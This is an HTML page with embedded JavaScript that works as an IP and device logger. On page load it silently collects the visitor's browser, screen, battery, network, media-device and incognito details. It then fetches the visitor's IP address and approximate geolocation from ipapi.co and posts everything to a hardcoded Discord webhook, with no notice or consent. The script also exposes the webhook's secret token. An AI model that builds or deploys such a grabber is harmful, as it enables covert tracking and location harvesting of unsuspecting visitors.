<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>IP & Device Info Sender</title>
</head>
<body>
  <h1>Sending device & IP info...</h1>
  <p>Check your Discord channel connected to the webhook.</p>

  <script>
    // ⚠️ Replace with your actual Discord webhook URL (frontend exposure risk!)
    const webhookUrl = "https://discord.com/api/webhooks/1432841888997834877/kGY6LdHzo7JliM6Kvw718EW9x2qlG6OojBb2CQc7Kov9G0Vqkn8De2mYqUgb1bRa7Ytv";

    async function safeJson(obj) {
      try {
        return JSON.stringify(obj, null, 2);
      } catch (e) {
        // fallback for circular refs
        const cache = new Set();
        return JSON.stringify(obj, (k, v) => {
          if (typeof v === "object" && v !== null) {
            if (cache.has(v)) return "[Circular]";
            cache.add(v);
          }
          return v;
        }, 2);
      }
    }

    async function collectDeviceInfo() {
      const info = {};

      // Basic navigator info
      info.useragent = navigator.userAgent || null;
      info.platform = navigator.platform || null;
      info.vendor = navigator.vendor || null;
      info.language = navigator.language || null;
      info.languages = navigator.languages || null;
      info.cookieEnabled = navigator.cookieEnabled ?? null;
      info.doNotTrack = navigator.doNotTrack ?? null;
      info.hardwareConcurrency = navigator.hardwareConcurrency ?? null; // CPU threads
      info.deviceMemory = navigator.deviceMemory ?? null; // GB (may be undefined)
      info.product = navigator.product ?? null;
      info.webdriver = navigator.webdriver ?? null; // bot automation hint

      // Screen
      if (window.screen) {
        info.screen = `${screen.width} x ${screen.height} x ${screen.colorDepth || 'unknown'}`;
        info.pixelRatio = window.devicePixelRatio ?? 1;
      } else {
        info.screen = null;
        info.pixelRatio = null;
      }

      // Time / Date / timezone / offset
      const now = new Date();
      info.datetime = now.toString();
      info.date = now.toLocaleString();
      try {
        info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || null;
      } catch (e) {
        info.timezone = null;
      }
      // offset in hours/minutes
      info.offset = (() => {
        const o = -new Date().getTimezoneOffset() / 60;
        return (o >= 0 ? "+" : "") + o;
      })();

      // Battery (async)
      try {
        if (navigator.getBattery) {
          const batt = await navigator.getBattery();
          info.battery = Math.round(batt.level * 100) + "%";
        } else {
          info.battery = null;
        }
      } catch (e) {
        info.battery = null;
      }

      // Connection (Network Information API)
      try {
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (conn) {
          info.network = conn.type || "unknown";
          info.rtt = conn.rtt != null ? `${conn.rtt} ms` : null;
          info.downlink = conn.downlink != null ? `${conn.downlink} Mbps` : null;
          info.effectiveType = conn.effectiveType || null; // e.g., '4g'
        } else {
          info.network = null;
          info.rtt = null;
          info.downlink = null;
          info.effectiveType = null;
        }
      } catch (e) {
        info.network = null;
      }

      // Touch support & input devices detection (basic)
      info.touchSupport = ('ontouchstart' in window) || (navigator.maxTouchPoints && navigator.maxTouchPoints > 0) || false;
      info.touchsupport = info.touchSupport ? "Yes" : "Not";

      // Media devices enumeration (may require permission in some browsers)
      try {
        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
          const devices = await navigator.mediaDevices.enumerateDevices();
          info.audiodevices = devices.filter(d => d.kind === 'audioinput').length ? "audioinput" : null;
          info.audioinput = devices.filter(d => d.kind === 'audioinput').map(d => d.label || d.deviceId) || [];
          info.audiooutput = devices.filter(d => d.kind === 'audiooutput').map(d => d.label || d.deviceId) || [];
          info.videoinput = devices.filter(d => d.kind === 'videoinput').map(d => d.label || d.deviceId) || [];
        } else {
          info.audiodevices = null;
          info.audioinput = null;
          info.audiooutput = null;
          info.videoinput = null;
        }
      } catch (e) {
        // If permissions denied, still capture that enumerate failed
        info.audiodevices = null;
        info.audioinput = "permission or enumerate failed";
        info.audiooutput = "permission or enumerate failed";
        info.videoinput = "permission or enumerate failed";
      }

      // Feature detection for sensors & features (approx)
      info.accelerometer = (typeof DeviceMotionEvent !== "undefined") ? "Yes" : "Not";
      info.gyroscope = (typeof DeviceOrientationEvent !== "undefined") ? "Yes" : "Not";
      info.hdr = (('getHDRMetadata' in HTMLVideoElement.prototype) ? "Yes" : "Not") || "Not";
      info.forcedcolors = (window.matchMedia && window.matchMedia('(forced-colors: active)').matches) ? "Yes" : "Not";
      info.reducedmotion = (window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches) ? "Yes" : "Not";
      info.darkmode = (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) ? "Yes" : "Not";
      info.contrast = (window.matchMedia && window.matchMedia('(prefers-contrast: more)').matches) ? "More" : "Not";

      // Storage & db support
      info.indexedDB = !!window.indexedDB;
      info.localStorage = (function() { try { return !!localStorage; } catch(e) { return null; } })();
      info.sessionStorage = (function() { try { return !!sessionStorage; } catch(e) { return null; } })();
      info.openDatabase = !!window.openDatabase;

      // Payment APIs detection (approx)
      try {
        info.applepay = (window.ApplePaySession && ApplePaySession.canMakePayments && typeof ApplePaySession.canMakePayments === 'function')
                        ? (await ApplePaySession.canMakePayments() ? "Yes" : "Not")
                        : "Not";
      } catch (e) {
        info.applepay = "Not";
      }
      try {
        info.googlepay = (typeof PaymentRequest === 'function') ? "Supported" : "Not";
      } catch (e) {
        info.googlepay = "Not";
      }

      // Pixel ratio & color gamut
      info.pixelratio = window.devicePixelRatio ?? 1;
      try {
        const gamut = (window.matchMedia && window.matchMedia('(color-gamut: p3)').matches) ? 'p3'
                    : (window.matchMedia && window.matchMedia('(color-gamut: rec2020)').matches) ? 'rec2020'
                    : 'srgb';
        info.colorgamut = gamut;
      } catch (e) {
        info.colorgamut = null;
      }

      // Monochrome / forced monochrome detection (best-effort)
      info.monochrome = (window.matchMedia && window.matchMedia('(monochrome)').matches) ? "Yes" : "Not";

      // Pixel depth / color depth
      info.colordepth = screen.colorDepth ?? null;

      // Touch support short format
      info.touchsupport = info.touchSupport ? "Yes" : "Not";

      // Cookie enabled (readable)
      info.cookiesenabled = navigator.cookieEnabled ? "Yes" : "Not";

      // Reduced motion etc already above
      info.reducedmotion = (window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches) ? "Yes" : "Not";

      // Language fields
      info.language = navigator.language || null;
      info.languages_list = navigator.languages || null;

      // Vendor / browser
      info.vendor = navigator.vendor || null;
      info.browser = (function() {
        const ua = navigator.userAgent || "";
        if (/Chrome\/(\d+)/.test(ua) && /Edg\//.test(ua) === false) return "Chrome";
        if (/Edg\//.test(ua)) return "Edge";
        if (/Firefox\//.test(ua)) return "Firefox";
        if (/Safari\//.test(ua) && /Chrome\//.test(ua) === false) return "Safari";
        return "Unknown";
      })();

      // Memory & CPU threads fallback names to match your fields
      info.RAM = navigator.deviceMemory ? navigator.deviceMemory + " Gb" : null;
      info["CPU Threads"] = navigator.hardwareConcurrency || null;

      // Referer
      info.referer = document.referrer || null;

      // Incognito detection (best-effort, not perfect) - simple heuristic
      info.incognito = null;
      try {
        // Many incognito checks are unreliable; we do a simple storage test
        const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
        if (!fs) {
          info.incognito = "Not detectable";
        } else {
          fs(window.TEMPORARY, 100, () => { info.incognito = "Not"; }, () => { info.incognito = "Yes"; });
        }
      } catch (e) {
        info.incognito = "Unknown";
      }

      // Screen contrast/hdr etc fallback already populated

      // Fingerprint placeholder (if you have a custom function)
      info.fingerprint = null;

      // timezone offset already above

      return info;
    }

    async function fetchIPInfo() {
      try {
        const res = await fetch("https://ipapi.co/json/");
        if (!res.ok) throw new Error("ipapi fetch failed");
        return await res.json();
      } catch (e) {
        return { ip: null };
      }
    }

    function buildMessageBlock(allData) {
      // turn into a neat code block for Discord
      const json = JSON.stringify(allData, null, 2);
      // Discord messages have char limits; if too large, send as truncated
      const maxChars = 1900;
      const body = "```\n" + (json.length > maxChars ? json.slice(0, maxChars) + "\n...TRUNCATED\n" : json) + "\n```";
      return body;
    }

    async function sendToWebhook(payloadString) {
      try {
        await fetch(webhookUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content: payloadString })
        });
        console.log("Sent device & IP info to webhook.");
      } catch (e) {
        console.error("Failed to send to webhook:", e);
      }
    }

    (async () => {
      try {
        // Collect device info (best-effort)
        const deviceInfo = await collectDeviceInfo();

        // Fetch IP & geo info
        const ipData = await fetchIPInfo();

        // Merge fields — keep the ipapi fields named like your list
        const merged = {
          // user-provided fields mapping (pull from ipData where available)
          ip: ipData.ip ?? null,
          country: ipData.country_name ?? ipData.country ?? null,
          city: ipData.city ?? null,
          state: ipData.region ?? null,
          latitude: ipData.latitude ?? ipData.lat ?? null,
          longitude: ipData.longitude ?? ipData.lon ?? null,
          accuracy: ipData['accuracy'] ?? ipData['accuracy-radius'] ?? "ip",
          isp: ipData.org ?? null,
          // Add navigator/collected device fields
          ...deviceInfo,
          // capture a few original helpful fields
          referer: document.referrer || deviceInfo.referer,
          datetime: new Date().toString(),
        };

        // If you have "fingerprint" logic, you could compute it; placeholder:
        merged.fingerprint = merged.fingerprint || "N/A";

        // Build message & send
        const message = buildMessageBlock(merged);
        await sendToWebhook(message);
      } catch (err) {
        console.error("Error collecting/sending info:", err);
      }
    })();

  </script>
</body>
</html>
